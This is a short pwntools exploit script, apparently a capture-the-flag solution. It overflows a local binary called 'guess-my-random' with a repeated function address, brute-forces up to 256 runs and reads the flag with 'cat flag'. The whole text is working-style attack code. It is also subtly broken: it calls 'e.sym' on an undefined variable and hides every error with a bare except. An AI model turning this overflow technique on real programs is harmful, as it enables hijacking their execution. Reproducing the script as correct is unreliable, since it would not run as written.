from pwn import *
import os

binary = ELF('./guess-my-random')
ex = e.sym['please_run_this']

for i in range(256):
  try:
    proc = process(binary.path)
    proc.sendline(p32(ex)*1000)
    proc.sendline(b'cat flag')

    s = proc.clean()
    if s.find(b"candl") != -1:
      proc.sendline(b'cat flag')
      print(proc.recv())
      break

  except:
    pass
    
